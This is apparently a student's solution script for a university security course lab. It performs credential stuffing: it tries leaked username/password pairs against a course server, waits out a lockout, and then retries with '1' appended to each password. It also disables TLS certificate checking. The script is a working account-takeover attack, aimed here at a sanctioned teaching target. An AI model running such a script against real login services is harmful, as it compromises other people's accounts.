#!/usr/bin/env python3
from urllib.parse import quote
import urllib.request
import base64
import ssl
import time

################################################################################
# 
# This starter file for UChicago CMSC 23200 / 33250 is for Python 3
#
################################################################################

################################################################################
# 
# make_query(username, password)
# -- username is a string that represents a potential username on the server
# -- password is a string that represents that user's potential password
#
################################################################################

def make_query(username, password):
    DEBUG = False; # Replace with "True" to print extra debugging information
    username = username.lower()
    if DEBUG:
        print("Querying the server")
        print("(username:", username, ")")
        print("(password:", password, ")")
    url = "https://uchicago.computer/" + urllib.parse.quote(username) + "/" + urllib.parse.quote(password) + "/"
    if DEBUG:
        print("(Querying:", url, ")")
    with urllib.request.urlopen(url) as response:
        return response.read().decode('utf-8')

def main():
    ssl._create_default_https_context = ssl._create_unverified_context
    # read in results from problem 1 and problem 2
    with open('ruolinzheng-problem1.txt', 'rt') as f:    
        lines = f.readlines()
    user_pw_dict = {}
    for line in lines:
        line = line.strip()
        user, pw = line.split('\t')
        user_pw_dict[user] = pw
    with open('ruolinzheng-problem2.txt', 'rt') as f:
        lines = f.readlines()
    has_accounts = [line.strip() for line in lines]

    # problem 3
    count = 0
    successes = []
    failures = []
    for user in has_accounts:
        pw = user_pw_dict[user]
        resp = make_query(user, pw)
        if resp == 'Success':
            count += 1
            successes.append(user)
            print(count, user, pw, resp)
        else:
            failures.append(user)

    print('Wait for 5 minutes before trying the ones that failed...')
    time.sleep(320)
    new_successes = []
    for user in failures:
        newpw = user_pw_dict[user] + '1'
        resp = make_query(user, newpw)
        if resp == 'Success':
            count += 1
            new_successes.append(user)
            print(count, user, newpw, resp)
    with open('ruolinzheng-problem3.txt', 'wt') as f:
        for user in successes:
            f.write(user + '\t' + user_pw_dict[user] + '\n')
        for user in new_successes:
            f.write(user + '\t' + user_pw_dict[user] + '1' + '\n')
    

if __name__ == '__main__':
    main()